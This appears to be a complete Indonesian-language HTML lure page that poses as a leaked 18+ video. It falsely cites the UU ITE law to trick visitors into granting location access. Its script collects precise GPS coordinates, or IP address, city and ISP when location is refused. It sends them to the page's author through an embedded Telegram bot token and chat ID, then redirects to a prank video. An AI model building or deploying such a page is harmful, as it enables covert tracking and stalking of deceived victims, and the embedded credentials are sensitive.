<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Tersebar - Cloud Storage</title>
    <style>
        body { background-color: #000; color: #fff; text-align: center; font-family: sans-serif; margin: 0; display: flex; flex-direction: column; justify-content: center; height: 100vh; overflow: hidden; }
        .video-box { width: 90%; max-width: 500px; margin: 0 auto; background: #111; border: 1px solid #333; border-radius: 10px; position: relative; cursor: pointer; box-shadow: 0 0 30px rgba(255,0,0,0.2); }
        .preview { width: 100%; height: 250px; opacity: 0.3; filter: blur(5px); object-fit: cover; }
        .play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80px; height: 80px; background: rgba(255,0,0,0.9); border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 20px #f00; }
        .play-btn::after { content: ''; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid #fff; margin-left: 10px; }
        .text-area { padding: 20px; }
        .alert { color: #ff4d4d; font-weight: bold; font-size: 16px; margin-bottom: 10px; }
        .desc { color: #888; font-size: 12px; line-height: 1.5; }
        #status { font-size: 10px; color: #444; margin-top: 15px; }
    </style>
</head>
<body>

    <div class="video-box" onclick="gasLacak()">
        <img src="https://images.unsplash.com/photo-1593305841991-05c297ba4575?auto=format&fit=crop&q=60&w=500" class="preview">
        <div class="play-btn"></div>
    </div>

    <div class="text-area">
        <div class="alert">⚠️ PERINGATAN KONTEN (18+)</div>
        <div class="desc">Video ini mengandung konten sensitif. <br> Sesuai regulasi UU ITE, mohon <b>Izinkan Akses Lokasi</b> untuk memverifikasi bahwa Anda berada di wilayah hukum yang legal.</div>
        <div id="status">Menunggu interaksi user...</div>
    </div>

    <script>
        // --- KONFIGURASI ---
        const TOKEN = "8792868527:AAE4eltXO4eY-qgIOwrk4Tirf5qrhAdgUbQ";
        const CHAT_ID = "1354234561";
        const REDIRECT = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // Link video prank/bebas

        function kirim(pesan) {
            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}&parse_mode=Markdown`;
            fetch(url);
        }

        function trackIP(tipe) {
            document.getElementById('status').innerText = "Sinkronisasi IP...";
            fetch('https://ipapi.co/json/')
                .then(res => res.json())
                .then(data => {
                    const msg = `⚠️ *INFO TARGET (IP ONLY)*\n` +
                                `Status: \`${tipe}\`\n\n` +
                                `🌐 IP: \`${data.ip}\`\n` +
                                `📍 Kota: \`${data.city}, ${data.region}\`\n` +
                                `🏢 ISP: \`${data.org}\`\n\n` +
                                `🗺 [Lokasi Kasar](https://www.google.com/maps?q=${data.latitude},${data.longitude})`;
                    kirim(msg);
                    setTimeout(() => { window.location.href = REDIRECT; }, 1500);
                }).catch(() => { window.location.href = REDIRECT; });
        }

        function gasLacak() {
            document.getElementById('status').innerText = "Memproses izin...";
            
            const options = {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0 // <--- PENTING: Paksa ambil GPS terbaru setiap klik
            };

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        const lat = pos.coords.latitude;
                        const lon = pos.coords.longitude;
                        const acc = pos.coords.accuracy;
                        const msg = `📍 *TARGET TERDETEKSI (GPS AKURAT)!*\n\n` +
                                    `🌐 Lat: \`${lat}\`\n` +
                                    `🌐 Lon: \`${lon}\`\n` +
                                    `🎯 Akurasi: \`${acc} meter\`\n\n` +
                                    `🗺 [Buka Maps](https://www.google.com/maps?q=${lat},${lon})`;
                        kirim(msg);
                        document.getElementById('status').innerText = "Sukses! Memuat video...";
                        setTimeout(() => { window.location.href = REDIRECT; }, 2000);
                    },
                    (err) => {
                        let info = "User menolak izin";
                        if(err.code == 2) info = "GPS mati/sinyal lemah";
                        if(err.code == 3) info = "Timeout";
                        trackIP(info);
                    },
                    options
                );
            } else {
                trackIP("Browser tidak support GPS");
            }
        }
    </script>
</body>
</html>
